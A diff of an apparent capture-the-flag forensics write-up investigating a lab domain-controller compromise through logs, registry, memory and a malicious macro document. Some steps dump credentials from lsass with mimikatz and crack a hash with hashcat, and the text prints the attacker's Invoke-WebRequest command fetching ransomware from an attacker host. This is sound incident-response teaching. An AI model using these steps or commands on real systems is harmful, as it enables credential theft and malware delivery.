@@ -42,11 +42,11 @@ An ActiveDirectory compromise case: adversaries were able to take over the corpo
 
 # #1	What is the OS Product name of PC01?
 
-We can solve this question in many ways. the easy one is that we can search for the OS Product name in the AD-ACLs JSON files which is provided with the challenge in the `20211122102526_computers.json` file. but first, we can use an online formatter to make it easy to read, I used this [website](https://jsonformatter.curiousconcept.com/#).
+We can solve this question in many ways. The easy one is that we can search for the OS Product name in the AD-ACLs JSON files, which is provided with the challenge in the `20211122102526_computers.json` file. But first, we can use an online formatter to make it easy to read. I used this [website](https://jsonformatter.curiousconcept.com/#).
 
 [![2](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/2.PNG)](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/2.PNG)
 
-another way to find the OS Product name from the registry hive is `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion`. we can use Registry Explorer to open the registry hive and find the key then get the OS Product name or simply we can use Autopsy Plugins to do that for us. by going to Operating System information in the Data Artifact section in Autopsy. we will see the same result.
+Another way to find the OS Product name from the registry hive is `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion`. We can use Registry Explorer to open the registry hive and find the key, then get the OS Product name, or simply we can use Autopsy Plugins to do that for us. by going to Operating System information in the Data Artifact section in Autopsy. We will see the same result.
 
 [![59](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/59.PNG)](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/59.PNG)
 
@@ -56,21 +56,21 @@ Flag : <span style="color: #909090">Windows 10 Enterprise 2016 LTSB</span>
 
 # #2	On 21st November, there was unplanned power off for PC01 machine. How long was PC01 powered on till this shutdown?
 
-Here he is asking about the time that PC01 was on till the unplanned power off. we can check Windows Event logs to get this info from `\Windows\System32\winevt\Logs\System.evtx` which stores this information, so we can use TurnedOnTimesView to view this information. 
+Here he is asking about the time that PC01 was on till the unplanned power off. We can check Windows Event logs to get this info from `\Windows\System32\winevt\Logs\System.evtx`, which stores this information, so we can use TurnedOnTimesView to view this information. 
 
 [![4](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/4.PNG)](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/4.PNG)
 
-as we see here there was unplanned power off and the time the PC01 until this unplanned power off is `11:31`.
+As we see here, there was unplanned power off, and the time the PC01 until this unplanned power off is `11:31`.
 
 Flag : <span style="color: #909090">11:31</span>
 
 # #3	Who was the last logged-in user on PC01?
 
-for this question we want to know the last logged-in user we can also find that in Windows Event logs in `\Windows\System32\winevt\Logs\Security.evtx` which store A successful account logon event with event id `4624` but so I will use Event Viewer to get that. by filtering the logs with `4624` we will get this output.
+For this question, we want to know the last logged-in user we can also find that in Windows Event logs in `\Windows\System32\winevt\Logs\Security.evtx`, which store A successful account logon event with event id `4624` but so I will use Event Viewer to get that. by filtering the logs with `4624` we will get this output.
 
 [![5](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/5.PNG)](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/5.PNG)
 
-there are too many logs so we can filter them by Date and Time also to get the last logged-in user. if we open the last event. we will find the last logged-in user on PC01.
+There are too many logs, so we can filter them by Date and Time to get the last logged-in user if we open the last event. We will find the last logged-in user on PC01.
 
 [![6](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/6.PNG)](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/6.PNG)
 
@@ -78,7 +78,7 @@ Flag : <span style="color: #909090">0xMohammed</span>
 
 # #4	What is the IP address of PC01?
 
-we can get the IP address of PC01 from registry hive `HKEY_LOCAL_MACHINE\SYSTEM` under `\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\` so we can use RegRipper to scan the hive and get the answer to us.
+We can get the IP address of PC01 from registry hive `HKEY_LOCAL_MACHINE\SYSTEM` under `\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\` so we can use RegRipper to scan the hive and get the answer to us.
 
 [![7](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/7.PNG)](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/7.PNG)
 
@@ -86,7 +86,7 @@ Flag : <span style="color: #909090">192.168.112.142</span>
 
 # #5	Which port was assigned to man service on PC01?
 
-the services which is running on the pc and assigned ports to it is stored in `Windows/System32/drivers/etc/services` file. so we can open it using any text editor to find the port assigned to man services.
+The services running on the pc and assigned ports are stored in the `Windows/System32/drivers/etc/services` file. So we can open it using any text editor to find the port assigned to man services.
 
 [![8](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/8.PNG)](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/8.PNG)
 
@@ -94,10 +94,10 @@ Flag : <span style="color: #909090">9535</span>
 
 # #6	What is the "Business.xlsx" LogFile Sequence Number?
 
-First what is MFT ? The MFT is a set of FILE records. Each file of the volume is completely described by one or more of these FILE Records and $LogFile Sequence Number (LSN) changes every time the record is modified. which is stored in the MFT.
-Each LSN is a 64-bit number containing the following components: a sequence number and an offset. An offset is stored in the lower part of an LSN, its value is a number of 8-byte increments from the beginning of a log file. This offset points to an LFS structure containing a client buffer and related metadata, this structure is called an LFS record. A sequence number is stored in the higher part, it’s a value from a counter which is incremented when a log file is wrapped (when a new structure is written to the beginning of the circular area, not to the end of this area).
+First, what is MFT? The MFT is a set of FILE records. Each file of the volume is completely described by one or more of these FILE Records, and $LogFile Sequence Number (LSN) changes every time the record is modified, which is stored in the MFT.
+Each LSN is a 64-bit number containing the following components: a sequence number and an offset. An offset is stored in the lower part of an LSN. Its value is a number of 8-byte increments from the beginning of a log file. This offset points to an LFS structure containing a client buffer and related metadata. This structure is called an LFS record. A sequence number is stored in the higher part. It's a value from a counter which is incremented when a log file is wrapped (when a new structure is written to the beginning of the circular area, not to the end of this area).
 we can get the that using MFTECmd and save the output to csv using command `MFTECmd.exe -f "C:\Temp\SomeMFT" --csv "c:\temp\out"`.
-after that we can search for the Business.xlsx file then we will find the LogFile Sequence Number.
+Afterward, we can search for the Business.xlsx file and find the LogFile Sequence Number.
 
 [![9](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/9.PNG)](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/9.PNG)
 
@@ -141,7 +141,7 @@ Flag : <span style="color: #909090">20418287</span>
 
 # #10	What is the folder name where note.txt resides?
 
-when it comes to know what is the folder name of file so we need to know about LNK Files.LNK files are a relatively simple but valuable artifact for the forensics investigator. They are shortcut files that link to an application or file commonly found on a user’s desktop, or throughout a system and end with an .LNK extension. LNK files can be created by the user, or automatically by the Windows operating system. Each has their own value and meaning. Windows-created LNK files are generated when a user opens a local or remote file or document, giving investigators valuable information on a suspect’s activity which one of them is The original path of the file which will give us the answer.so after searching for `note.txt` i found LNK file associated with it at `\Users\administrator\AppData\Roaming\Microsoft\Windows\Recent\note.lnk`. i will use LECmd to analyse the LNK file with command `LECmd.exe -f "location of LNK file"` then we will see the answer.
+When it comes to knowing the file's folder name, we need to know about LNK Files.LNK files are a relatively simple but valuable artifact for the forensics investigator. Shortcut files link to an application or file commonly found on a user's desktop or throughout a system and end with an .LNK extension. LNK files can be created by the user or automatically by the Windows operating system. Each has its value and meaning. Windows-created LNK files are generated when a user opens a local or remote file or document, giving investigators valuable information on a suspect's activity. Which one of them is The original path of the file will provide us with the answer. So after searching for `note.txt`, I found the LNK file associated with it at `\Users\administrator\AppData\Roaming\Microsoft\Windows\Recent\note.lnk`. I will use LECmd to analyze the LNK file with the command `LECmd.exe -f "location of LNK file" ` then, we will see the answer.
 
 [![16](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/16.PNG)](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/16.PNG)
 
@@ -149,19 +149,19 @@ Flag : <span style="color: #909090">asd</span>
 
 # #11	Which volatility 2 profile should be used to analyze the memory image?
 
-we will use volatility to analyze the memory image, so we will use the `imageinfo` plugin to give us the profile. we will notice that there are too many profiles suggested so we need to make sure from the profile.
+We will use volatility to analyze the memory image, so we will use the `imageinfo` plugin to give us the profile. We will notice that too many profiles are suggested, so we must ensure from the profile.
 
 [![17](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/17.PNG)](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/17.PNG)
 
-here I will use vol3 to get the profile smartly :D. we can dump the registry hive `HKEY_LOCAL_MACHINE\Software` using vol3 and then analyze it to get the right profile. so first I start with the `windows.registry.hivelist.HiveList` plugin to list available registry hives.
+Here I will use vol3 to get the profile smartly :D. we can dump the registry hive `HKEY_LOCAL_MACHINE\Software` using vol3 and then analyze it to get the right profile. So first, I start with the `windows.registry.hivelist.HiveList` plugin to list available registry hives.
 
 [![18](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/18.PNG)](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/18.PNG)
 
-then we need to dump the Software Registry hive. so I used the `windows.registry.hivelist` plugin to dump it.
+Then we need to dump the Software Registry hive. So I used the `windows.registry.hivelist` plugin to dump it.
 
 [![19](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/19.PNG)](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/19.PNG)
 
-then we need to analyze the registry. we can use Registry Explorer for that. then to get the right profile we can go to the key `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion` we will see subkeys which are `CurrentBuild=14393` and `ProductName=Windows Server 2016 Standard Evaluation` that's all we need, then we are now Sure from the right profile.
+Then we need to analyze the registry. We can use Registry Explorer for that. Then to get the right profile, we can go to the key `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion`. We will see subkeys which are `CurrentBuild=14393` and `ProductName=Windows Server 2016 Standard Evaluation` that's all we need, then we are now Sure from the right profile.
 
 [![60](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/60.PNG)](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/60.PNG)
 
@@ -171,7 +171,7 @@ Flag : <span style="color: #909090">Win2016x64_14393</span>
 
 # #12	Analyzing the memory what is the physical address of the SOFTWARE registry hive?
 
-for this task we can return to using vol2 to get the physical address as what we got from vol3 was the Virtual address. so we will use the profile that we got and `hivelist` plugin to list all registry hives with their Virtual and Physical addresses.
+For this task, we can return to using vol2 to get the physical address as what we got from vol3 was the Virtual address. So we will use our profile and the `hivelist` plugin to list all registry hives with their Virtual and Physical addresses.
 
 [![21](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/21.PNG)](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/21.PNG)
 
@@ -179,15 +179,15 @@ Flag : <span style="color: #909090">0x00000000040f7000</span>
 
 # #13	What is the master key of the user "0xMohammed"?
 
-to get the master key we can use windbg and mimikatz. so first we will go to windbg then select File -> Open Crash Dump then load the memory.dmp and start by `!analyze -v` to start analysis of the dump.  
+To get the master key, we can use windbg and mimikatz. So first, we will go to windbg, select File -> Open Crash Dump, load the memory.dmp and start by `!analyze -v` to begin the dump analysis.  
 
 [![22](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/22.PNG)](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/22.PNG)
 
-then we can need to load `mimilib.dll` to start mimikatz so you need to check its location first in your machine then use `.load <your path>\mimilib.dll`.
+Then we can need to load `mimilib.dll` to start mimikatz, so you need to check its location first in your machine, then use `.load <your path>\mimilib.dll`.
 
 [![23](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/23.PNG)](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/23.PNG)
 
-then as shown we can search for `lsass.exe` in the dump using `!process 0 0 lsass.exe` to get its EPROCESS address but first what is EPROCESS, The EPROCESS structure is the kernel’s representation of a process object. For instance, if the ObReferenceObjectByHandle function successfully resolves a handle though directed to do so only if the object type is PsProcessType, then what the function produces as its pointer to the object is a pointer to an EPROCESS. so we need to point at the EPROCESS address so we can dump the credentials from the process. we can use `.process /r /p ffffba033ef746c0` then enter `!mimikatz`.them we will get the MasterKey of user "0xMohammed".
+Then as shown, we can search for `lsass.exe` in the dump using `!process 0 0 lsass.exe` to get its EPROCESS address but first, what is EPROCESS? The EPROCESS structure is the kernel's representation of a process object. For instance, if the ObReferenceObjectByHandle function successfully resolves a handle though directed to do so only if the object type is PsProcessType, then what the function produces as its pointer to the object is a pointer to an EPROCESS. So we need to point to the EPROCESS address to dump the credentials from the process. we can use `.process /r /p ffffba033ef746c0` then enter `!mimikatz`.Then we will get the MasterKey of user "0xMohammed".
 
 [![24](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/24.PNG)](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/24.PNG)
 
@@ -196,11 +196,11 @@ Flag : <span style="color: #909090">1652c67aa6719519492e67d1b39cab91e7804eb26b25
 
 # #14	Using the provided word list, what is the password of the user "0xMohammed"?
 
-we need first to get the NTLM hash of the user "0xMohammed" which relies on password hashing, which is a one-way function that produces a string of text based on an input file, Kerberos leverages encryption, which is a two-way function that scrambles and unlocks information using an encryption key and decryption key respectively. to get its password. we can find it in the output of the previous question.
+We need first to get the NTLM hash of the user "0xMohammed" which relies on password hashing, a one-way function that produces a string of text based on an input file. Kerberos leverages encryption, a two-way function that scrambles and unlocks information using encryption and decryption keys. To get its password. We can find it in the output of the previous question.
 
 [![25](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/25.PNG)](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/25.PNG)
 
-then we can use the provided wordlist `wordlist.txt` to crack it using hashcat then we will find the password of thhe user "0xMohammed".
+Then we can use the wordlist `wordlist.txt` to crack it using hashcat. Then, we will find the password of the user "0xMohammed".
 
 [![26](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/26.PNG)](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/26.PNG)
 
@@ -208,11 +208,11 @@ Flag : <span style="color: #909090">0xmohammed!</span>
 
 # #15	What is the name of the first malware detected by Windows Defender?
 
-to know the first malware detected by Windows Defender we can find that in Windows Events Log especially in `Microsoft-Windows-Windows Defender%4Operational.evtx` so we can use EventViewer to open it.
+To know the first malware detected by Windows Defender, we can find that in Windows Events Log, especially in `Microsoft-Windows-Windows Defender%4Operational.evtx`, so we can use EventViewer to open it.
 
 [![27](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/27.PNG)](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/27.PNG)
 
-then we can filter the logs with Event ID: 1116 which is used to view Message of The antimalware platform detected malware or other potentially unwanted software. but we need the `first malware detected`. so we need to arrange them by time and date too. then we can find our answer.
+Then we can filter the logs with Event ID: 1116, which is used to view Messages of The antimalware platform that detected malware or other potentially unwanted software. But we need the `first malware detected`. So we need to arrange them by time and date too. Then we can find our answer.
 
 [![28](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/28.PNG)](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/28.PNG)
 
@@ -220,15 +220,15 @@ Flag : <span style="color: #909090">Exploit:Win32/ShellCode.BN</span>
 
 # #16	Provide the date and time when the attacker clicked send (submitted) the malicious email?
 
-so for this question i used Magnet AXIOM Examine to search if there is any malicious mail first. then i went to Email then Outlook Emails then i found this Email. which looks interesting !.
+So for this question, I used Magnet AXIOM Examine to search if there was any malicious mail first. Then I went to Email, Outlook Emails. Then I found this Email. Which looks interesting !.
 
 [![29](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/29.PNG)](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/29.PNG)
 
-so let's try to find first if this Email Attachment is malicoius or not. then we can go to `\Users\labib\Documents\Outlook Files\Outlook.pst` and we can use 4n6 Outlook Forensics Wizard to get the attachment from Outlook.pst file and after submitting it to virus total we can see that it's the malicious email.
+So let's try to find out whether this Email Attachment is malicious. Then we can go to `\Users\labib\Documents\Outlook Files\Outlook.pst`, and we can use 4n6 Outlook Forensics Wizard to get the attachment from Outlook.pst file, and after submitting it to virus total, we can see that it's the malicious email.
 
 [![30](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/30.PNG)](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/30.PNG)
 
-then we need to know date and time when the attacker send the malicious email so if we select the message and go to message properties then we will see PidTagClientSubmitTime Canonical Property which Contains the date and time the message sender submitted a message.
+Then we need to know the date and time when the attacker sent the malicious email, so if we select the message and go to message properties, we will see PidTagClientSubmitTime Canonical Property which Contains the date and time the message sender submitted a message.
 
 [![31](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/31.PNG)](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/31.PNG)
 
@@ -236,58 +236,58 @@ Flag : <span style="color: #909090">12/08/2021 04:47:48 AM</span>
 
 # #17	What is the IP address and port on which the attacker received the reverse shell? IP:PORT
 
-in this question first i thought that to get the IP:PORT of the attacker to run the Malicious Document then monitor the network traffic that happened so we might be lucky and find the IP:PORT of the attacker at first i waste a lot of time running it with OFFICE 2016 but When I despaired i tried it with OFFICE 2013 and it worked.
-so we can now run it and open FakeNet along with it, also we need to enable content to run the macros and see if there is something.
+In this question, first, I thought that to get the IP:PORT of the attacker to run the Malicious Document and then monitor the network traffic that happened, we might be lucky and find the IP:PORT of the attacker. At first, I wasted a lot of time running it with OFFICE 2016, but When I despaired, I tried it with OFFICE 2013, and it worked.
+So we can now run it and open FakeNet along with it. Also, we need to enable content to run the macros and see if there is something.
 
 [![54](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/54.PNG)](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/54.PNG)
 
-as we see there is somthing that seems malicious which it's using GET Method that used to request data from a specified resource. and the IP:PORT revealed. also we can see that in the generated pcap from FakeNet.
+As we see, something seems malicious: using GET Method to request data from a specified resource. And the IP:PORT was revealed. Also, we can see that in the generated pcap from FakeNet.
 
 [![55](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/55.PNG)](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/55.PNG)
 
 Flag : <span style="color: #909090">192.168.112.128:8080</span>
 # #18	Analyzing the reverse shell. What is the first argument given to InternetErrorDlg API?
 
-in this question we can start by analysing the Malicious Document so i will start analysing it using olevba. but got nothing usefull after that i used `olevba "Unpaid Invoice.xls" --show-pcode` to see if there is VBA Stomping and yeah there is an array it looks like that this is the shellcode.
+In this question, we can start by analyzing the Malicious Document, so I will begin to explore it using olevba. But I got nothing useful after that. I used `olevba "Unpaid Invoice.xls" --show-pcode` to see if there is VBA Stomping, and yeah, there is an array. It looks like this is the shellcode.
 
 [![53](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/53.PNG)](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/53.PNG)
 
-so we need to extract this array and put it in a new file to analyse it.
+So we need to extract this array and put it in a new file to analyze it.
 
 [![56](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/56.PNG)](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/56.PNG)
 
-then we will save it as .sc and i will use scdbg to analyse it. i tried with scdbg /f but just got this which also give us the IP:PORT from the shellcode. but didn't get the InternetErrorDlg API.
+Then we will save it as .sc, and I will use scdbg to analyze it. I tried with scdbg /f but just got this which also gives us the IP:PORT from the shellcode. But I didn't get the InternetErrorDlg API.
 
 [![57](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/57.PNG)](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/57.PNG)
 
-so i thought to use `scdbg -s -1 /f` to make the number of steps unlimitted so we can extract everything from it. 
+So I thought to use `scdbg -s -1 /f` to make the number of steps unlimited so we can extract everything from it. 
 
 [![58](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/58.PNG)](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/58.PNG)
 
 Flag : <span style="color: #909090">11223344</span>
 # #19	What is the MITRE ID of the technique used by the attacker to achieve persistence?
 
-so first i will check Previous Command History in PowerShell Console to see if there is something malicious or related to achieving persistence as it's sometimes good place to start with. so we can check that at `\Users\administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt` then we will see that there is command executed with Schtasks.exe which Enables an administrator to create, delete, query, change, run, and end scheduled tasks on a local or remote computer.
+So first, I will check Previous Command History in PowerShell Console to see if there is something malicious or related to achieving persistence as it's sometimes an excellent place to start with. so we can check that at `\Users\administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt` then we will see that there is the command executed with Schtasks.exe which Enables an administrator to create, delete, query, change, run, and end scheduled tasks on a local or remote computer.
 
 [![32](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/32.PNG)](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/32.PNG)
 
-so then we can check Windows Event logs for the scheduled tasks events we can go to `\Windows\System32\winevt\Logs\Microsoft-Windows-TaskScheduler%4Operational.evtx` and i will use Event Viewer Like Usual 😄. we can filter the logs with Event ID with 106 for Scheduled task created. then we will see that there is many Task Schedule registered for many users so that's the persistence here we also can check `\Windows\System32\Tasks` where these tasks stored.
+So then, we can check Windows Event logs for the scheduled tasks events. We can go to `\Windows\System32\winevt\Logs\Microsoft-Windows-TaskScheduler%4Operational.evtx,` and I will use Event Viewer Like Usual 😄. We can filter the logs with Event ID with 106 for a Scheduled task created. Then we will see that many Task Schedules are registered for many users, so that's the persistence here. We also can check `\Windows\System32\Tasks` where these tasks are stored.
 
 [![33](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/33.PNG)](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/33.PNG)
 
 [![34](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/34.PNG)](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/34.PNG)
 
-after searching on this technique we will find the answer.
+After searching on this technique, we will find the answer.
 
 Flag : <span style="color: #909090">T1053.005</span>
 
 # #20	What is the attacker's C2 domain name?
 
-for this question we solved it when we checked the Previous Command History in PowerShell Console in which the attacker use Mshta.exe which is a utility that executes Microsoft HTML Applications (HTA) files to run the malicious file from the C2 domain name.  
+For this question, we solved it when we checked the Previous Command History in PowerShell Console. The attacker used Mshta.exe, a utility that executes Microsoft HTML Applications (HTA) files, to run the malicious file from the C2 domain name.  
 
 [![35](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/35.PNG)](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/35.PNG)
 
-we can also find it another way by checking one of the sheduled task if we open `\Windows\System32\Tasks\MicrosoftEdge` using text editor we can find the same answer.
+We can also find it another way by checking one of the scheduled tasks. Using a text editor, we can see the same answer if we open `\Windows\System32\Tasks\MicrosoftEdge`.
 
 [![36](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/36.PNG)](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/36.PNG)
 
@@ -295,7 +295,7 @@ Flag : <span style="color: #909090">c2.cyberdefenders.org</span>
 
 # #21	what is the name of the tool used by the attacker to collect AD information?
 
-we can first check if it's located in registry through `NTUSER.DAT\Software\Microsoft\Windows\Current Version\Explorer\RecentDocs` in the key of Most Recently Used (MRU) which are lists of recently used programs or opened files that the Windows operating system saves in the Windows Registry. so i will use for this Magnet AXIOM Examine to get it fast then we will go to Operating System Artifact then we will go to MRU Recent Files & Folders. as we see the user labib accessed zip file which seems after searching that it's used for Active Directory Enumeration and collecting AD information.
+We can first check if it's located in the registry through `NTUSER.DAT\Software\Microsoft\Windows\Current Version\Explorer\RecentDocs` in the key of Most Recently Used (MRU), which are lists of recently used programs or opened files that the Windows operating system saves in the Windows Registry. So I will use this Magnet AXIOM Examine to get it fast, then we will go to Operating System Artifact. We will go to MRU Recent Files & Folders. as we see the user labib accessed zip file, which seems after searching that it's used for Active Directory Enumeration and collecting AD information.
 
 [![37](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/37.PNG)](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/37.PNG)
 
@@ -303,7 +303,7 @@ Flag : <span style="color: #909090">bloodhound</span>
 
 # #22	What is the PID of the malicious process?
 
-we can use `malfind` plugin which helps to find hidden or injected code/DLLs in user mode memory, based on characteristics such as VAD tag and page permissions. we will see that they're a lot of processes that might be suspicious so we can dump them using also `malfind` and `--dump-dir=DUMP_DIR` then we can scan them using virustotal. then we will find that only one process which it's PID `3140` is malicious.
+We can use the `malfind` plugin, which helps to find hidden or injected code/DLLs in user mode memory based on characteristics such as VAD tag and page permissions. We will see that there are many processes that might be suspicious so that we can dump them also using `malfind` and `--dump-dir=DUMP_DIR`, then we can scan them using virustotal. Then we will find that only one process which it's PID `3140` is malicious.
 
 [![38](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/38.PNG)](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/38.PNG)
 
@@ -311,7 +311,7 @@ Flag : <span style="color: #909090">3140</span>
 
 # #23	What is the family of ransomware?
 
-as we saw from the previous question that's that family of ransomware is `DarkSide`. we also can find another way we can dump all processes to an executable file using `ProcDump` plugin and `--dump-dir=DUMP_DIR` then we can scan the whole directory using clamscan.
+As we saw from the previous question that's that family of ransomware is `DarkSide`. We can also find another way to dump all processes to an executable file using the `ProcDump` plugin and `-dump-dir=DUMP_DIR`. Then, we can scan the whole directory using clamscan.
 
 [![39](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/39.PNG)](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/39.PNG)
 
@@ -321,11 +321,11 @@ Flag : <span style="color: #909090">DarkSide</span>
 
 # #24	What is the command invoked by the attacker to download the ransomware?
 
-my idea is that for downloading the ransomware it might be needing a URL to download. so I used Bulk-Extractor to extract URL's from the memory dump.
+My idea is that for downloading the ransomware, it might need a URL to download. So I used Bulk-Extractor to extract URLs from the memory dump.
 
 [![41](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/41.PNG)](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/41.PNG)
 
-then after searching I found in `url.txt` that command. we can guess the rest of it but we can make sure by searching for that in the dump. so we can use strings on the memory dump so we can get the whole command. then we will find the whole command.
+Then after searching, I found in `url.txt` that command. We can guess the rest, but we can make sure by searching for that in the dump. So we can use strings on the memory dump to get the whole command. Then we will find the entire command.
 
 [![42](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/42.PNG)](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/42.PNG)
 
@@ -333,9 +333,9 @@ then after searching I found in `url.txt` that command. we can guess the rest of
 
 Flag : <span style="color: #909090">Invoke-WebRequest http://192.168.112.128:8000/svchost.exe -OutFile svchost.exe</span>
 
-# #25	Provide the number of ransomware process' privileges that are enabled by default?
+# #25	Provide the number of ransomware process' privileges that are enabled by default.
 
-First what is process' privileges, Privileges determine the type of system operations that a user account can perform. An administrator assigns privileges to user and group accounts. Each user's privileges include those granted to the user and to the groups to which the user belongs. so we can use `privs` volatility plugin to Display process privileges and we can specify the output to only show the PID of the ransomware process which is `3140` with `privs -p 3140` we can also filter the attribute with `Enabled,Default` as asked in the question. 
+First, what are process' privileges? Privileges determine the type of system operations that a user account can perform. An administrator assigns privileges to user and group accounts. Each user's privileges include those granted to the user and to the groups to which the user belongs. So we can use the `privs` volatility plugin to Display process privileges, and we can specify the output to only show the PID of the ransomware process, which is `3140` with `privs -p 3140`. As the question asks, we can also filter the attribute with `Enabled, Default`. 
 
 [![44](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/44.PNG)](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/44.PNG)
 
@@ -345,21 +345,21 @@ Flag : <span style="color: #909090">25</span>
 
 # #26	What is the pool tag of the ransomware process?
 
-At first we can define Pool tag scanning as a process commonly used in memory analysis in order to locate kernel object allocations, enabling investigators to discover evidence of artifacts that may have been freed or otherwise maliciously hidden from the operating system. but first we need to know about A kernel pool is a range of memory that can be divided up into smaller blocks for storing any type of data that a kernel-mode component (the NT module, third-party device driver, etc.) requests.
+At first, we can define Pool tag scanning as a process commonly used in memory analysis to locate kernel object allocations, enabling investigators to discover evidence of artifacts that may have been freed or otherwise maliciously hidden from the operating system. But first, we need to know that A kernel pool is a range of memory that can be divided into smaller blocks for storing any type of data that a kernel-mode component (the NT module, third-party device driver, etc.) requests.
 
 [![46](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/46.PNG)](/assets/images/CTF-WriteUp/Cyber-Defenders-Pwned_DC/46.PNG)
 
-so it's divided into 4 parts: 
+So it's divided into four parts: 
 - `_POOL_HEADER` 0x10 bytes.
 - `Optional_headers` it changes. 
 - `_OBJECT_HEADER` 0x30 bytes.
 - `Object_Body` Object size varies per structure.
 
-so to find the pooltag we need to jump to the `_POOL_HEADER`. we can do that by subtracting the values of each header size from the physical address of process. then i will use volshell plugin to do that. we first will make current cotext at `svchost.exe` by providing the PID of the process to volshell.
+So to find the pool tag, we need to jump to the `_POOL_HEADER`. We can do that by subtracting the values of each header size from the physical address of the process. Then I will use the volshell plugin to do that. We first will make the current context at `svchost.exe` by providing the PID of the process to volshell.
 
